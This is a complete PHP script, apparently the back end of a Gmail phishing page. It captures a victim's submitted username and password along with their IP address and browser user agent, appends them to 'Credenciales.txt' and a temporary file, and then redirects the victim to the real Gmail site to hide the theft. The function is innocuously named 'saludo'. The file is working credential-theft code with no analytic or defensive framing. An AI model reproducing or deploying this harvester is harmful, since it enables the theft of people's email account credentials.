<?php 

function saludo() {
    $usuario = $_POST["identifier"];
    $nuevaURL = "https://gmail.com";
    $_SERVER['REMOTE_ADDR'];
    $IP = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $AGENT = $_SERVER['HTTP_USER_AGENT'];
    $contraseña = $_POST["password"];

    $archivo = fopen("Credenciales.txt", "a+");
    fwrite($archivo, "\nUsuario: $usuario\n");
    fwrite($archivo, "Contraseña: $contraseña\n");
    fwrite($archivo, "Direccion IP: $IP\n");
    fwrite($archivo, "Agente: $AGENT\n");

    $temporal = fopen("temporal.txt", "w");
    fwrite($temporal, "\nUsuario: $usuario\n");
    fwrite($temporal, "Contraseña: $contraseña\n");
    fwrite($temporal, "Direccion IP: $IP\n");
    fwrite($temporal, "Agente: $AGENT\n");
    header("Location: $nuevaURL");
    die();
    
}

saludo();


?>
